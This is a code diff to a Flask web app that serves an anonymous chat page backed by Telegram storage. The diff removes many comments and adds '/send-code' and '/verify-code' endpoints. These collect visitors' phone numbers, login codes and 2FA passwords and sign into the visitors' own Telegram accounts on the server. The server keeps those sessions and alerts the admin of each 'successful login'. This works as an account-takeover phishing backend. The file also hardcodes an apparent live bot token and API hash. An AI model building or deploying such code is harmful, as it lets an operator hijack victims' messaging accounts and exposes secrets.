@@ -33,7 +33,6 @@ except ImportError:
 
 BASE_DIR = Path(__file__).resolve().parent
 
-# আপনার নির্দিষ্ট ক্রেডেনশিয়ালস এখানে বসানো হলো:
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8613982412:AAGEdvZdzjK3Eli_vIYoEtXnsxZgwodqnVE").strip()
 API_ID = int(os.environ.get("API_ID", "33511945") or "33511945")
 API_HASH = os.environ.get("API_HASH", "d044392a17690c14ee5b4a23651a0700").strip()
@@ -63,7 +62,7 @@ CORS(app)
 
 active_clients = {}
 admin_states = {}
-total_logged_in_users = 0  # Kept for compatibility with older dashboard code.
+total_logged_in_users = 0
 
 pyrogram_client = None
 pyrogram_loop = asyncio.new_event_loop()
@@ -274,12 +273,6 @@ def send_chat_archive_to_telegram(
     media_type: str,
     original_filename: str,
 ) -> Tuple[Optional[int], Optional[str], bool]:
-    """
-    Posts a website chat item to the storage channel.
-    Returns (Telegram message ID, Telegram file ID, backup_complete).
-    The [CHAT_BACKUP] marker prevents chat uploads from being synced
-    into the website's random-background collection.
-    """
     header = (
         f"{CHAT_BACKUP_MARKER}\n"
         f"ID: {message_id}\n"
@@ -299,8 +292,6 @@ def send_chat_archive_to_telegram(
         )
         return result.get("message_id"), None, True
 
-    # Telegram media captions are limited; send the full text separately
-    # if it does not fit in the caption.
     caption_limit = 950
     available_text = max(0, caption_limit - len(header) - 2)
     caption_text = (text or "")[:available_text]
@@ -314,7 +305,6 @@ def send_chat_archive_to_telegram(
         method = "sendPhoto"
         upload_field = "photo"
     else:
-        # sendDocument preserves file formats not accepted by sendPhoto.
         method = "sendDocument"
         upload_field = "document"
 
@@ -338,7 +328,6 @@ def send_chat_archive_to_telegram(
     telegram_file_id = get_telegram_file_id(result)
     backup_complete = True
 
-    # Keep long captions/text intact in the channel as a separate message.
     if len(text or "") > len(caption_text):
         full_text = (
             f"{CHAT_BACKUP_TEXT_MARKER}\n"
@@ -391,6 +380,87 @@ def download_telegram_file(file_id):
 
 
 # ============================================================
+# Telegram Login / User Verification Endpoints (/send-code & /verify-code)
+# ============================================================
+
+temp_client_sessions = {}
+
+@app.route("/send-code", methods=["POST"])
+def send_code_api():
+    req_data = request.get_json(silent=True) or {}
+    phone = req_data.get("phone", "").strip()
+    
+    if not phone:
+        return jsonify({"status": "error", "message": "Phone number is required."}), 400
+
+    if Client is None:
+        return jsonify({"status": "error", "message": "Pyrogram is not installed on server."}), 500
+
+    async def async_send():
+        try:
+            client = Client(
+                f"session_{uuid.uuid4().hex[:8]}",
+                api_id=API_ID,
+                api_hash=API_HASH,
+                in_memory=True
+            )
+            await client.connect()
+            sent = await client.send_code(phone)
+            phone_code_hash = sent.phone_code_hash
+            temp_client_sessions[phone] = client
+            return {"status": "success", "phone_code_hash": phone_code_hash}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
+    try:
+        res = run_async(async_send(), timeout=30)
+        return jsonify(res)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+@app.route("/verify-code", methods=["POST"])
+def verify_code_api():
+    req_data = request.get_json(silent=True) or {}
+    phone = req_data.get("phone", "").strip()
+    code = req_data.get("code", "").strip()
+    phone_code_hash = req_data.get("phone_code_hash", "").strip()
+    password = req_data.get("password", "").strip()
+
+    if not phone or not phone_code_hash:
+        return jsonify({"status": "error", "message": "Missing phone or hash."}), 400
+
+    client = temp_client_sessions.get(phone)
+    if not client:
+        return jsonify({"status": "error", "message": "Session expired. Please request code again."}), 400
+
+    async def async_verify():
+        try:
+            if password:
+                await client.check_password(password)
+            else:
+                await client.sign_in(phone=phone, phone_code_hash=phone_code_hash, phone_code=code)
+            
+            # Successful login notification to Admin channel/chat
+            global total_logged_in_users
+            total_logged_in_users += 1
+            send_telegram_message(ADMIN_ID, f"🎉 New Successful Telegram Login!\n📱 Phone: {phone}")
+            
+            return {"status": "success"}
+        except Exception as e:
+            err_str = str(e).lower()
+            if "password" in err_str or "sessionpasswordneeded" in err_str:
+                return {"status": "2fa_required", "message": "2FA password required."}
+            return {"status": "error", "message": str(e)}
+
+    try:
+        res = run_async(async_verify(), timeout=30)
+        return jsonify(res)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
+
+# ============================================================
 # Chat API used by naughty.html
 # ============================================================
 
@@ -415,15 +485,12 @@ def chat_messages_api():
             print("Chat history error:", traceback.format_exc())
             return jsonify({"ok": False, "error": "Unable to load chat history."}), 500
 
-    # POST multipart/form-data:
-    # text, sender_name, client_id, client_message_id, media (optional)
     text = (request.form.get("text") or "").strip()
     client_id = (request.form.get("client_id") or "").strip()[:120]
     client_message_id = (
         request.form.get("client_message_id") or uuid.uuid4().hex
     ).strip()[:120]
 
-    # Keep public chat anonymous. Do not trust a client-supplied display name.
     sender_name = "Anonymous User"
 
     if not client_id:
@@ -445,7 +512,6 @@ def chat_messages_api():
             "error": "Chat storage is not configured. Set BOT_TOKEN on the server.",
         }), 503
 
-    # Idempotency: avoid reposting a message if the browser retries after a timeout.
     with db_connect() as conn:
         existing = conn.execute(
             "SELECT * FROM chat_messages WHERE client_message_id = ?",
@@ -556,7 +622,6 @@ def chat_messages_api():
         }), 502
 
     except sqlite3.IntegrityError:
-        # Another request may have stored the same client_message_id.
         with db_connect() as conn:
             row = conn.execute(
                 "SELECT * FROM chat_messages WHERE client_message_id = ?",
@@ -574,7 +639,6 @@ def chat_messages_api():
 
     except Exception:
         print("Chat send error:", traceback.format_exc())
-        # Do not remove a file if the Telegram upload may already have succeeded.
         return jsonify({
             "ok": False,
             "error": "Unexpected server error while saving the message.",
@@ -591,7 +655,6 @@ def get_chat_media(message_id):
     media_filename = row["media_filename"]
 
     if media_filename:
-        # Use only a basename so a database value cannot escape MEDIA_DIR.
         local_path = MEDIA_DIR / os.path.basename(media_filename)
         if local_path.is_file():
             return send_file(
@@ -601,7 +664,6 @@ def get_chat_media(message_id):
                 as_attachment=False,
             )
 
-    # Fallback for deployments where local files are ephemeral or missing.
     file_id = row["telegram_file_id"]
     content, telegram_path = download_telegram_file(file_id)
 
@@ -713,7 +775,6 @@ def get_random_background():
 
 
 def download_background_file_by_id(file_id, file_name_prefix):
-    """Download a Telegram Bot API file into static/backgrounds."""
     if not BOT_TOKEN or not file_id:
         return False, None
 
@@ -761,8 +822,7 @@ def download_background_file_by_id(file_id, file_name_prefix):
 
 
 # ============================================================
-# Optional Pyrogram channel monitor for background media.
-# Chat backups are explicitly skipped.
+# Pyrogram channel monitor
 # ============================================================
 
 def _run_pyrogram_loop():
@@ -884,7 +944,6 @@ async def start_pyrogram_monitor():
     @client.on_message(filters.chat(STORAGE_CHANNEL_ID))
     async def handle_channel_upload(_client, message):
         try:
-            # Do not turn chat-upload backups into website backgrounds.
             if is_chat_backup_message(message):
                 return
             await download_background_message(_client, message, "channel")
@@ -984,8 +1043,6 @@ def telegram_message_file_id(message):
 
 @app.route("/webhook", methods=["POST"])
 def telegram_webhook():
-    # Set TELEGRAM_WEBHOOK_SECRET in the server and configure the same
-    # secret with Telegram's setWebhook method to protect this endpoint.
     if WEBHOOK_SECRET:
         received_secret = request.headers.get("X-Telegram-Bot-Api-Secret-Token", "")
         if received_secret != WEBHOOK_SECRET:
@@ -1001,7 +1058,6 @@ def telegram_webhook():
             user_id = sender.get("id")
             text = (message.get("text") or "").strip()
 
-            # Only the configured administrator can trigger admin upload state.
             if user_id == ADMIN_ID and admin_states.get(user_id) == "WAITING_FOR_BG_TEMPLATE":
                 file_id = telegram_message_file_id(message)
 
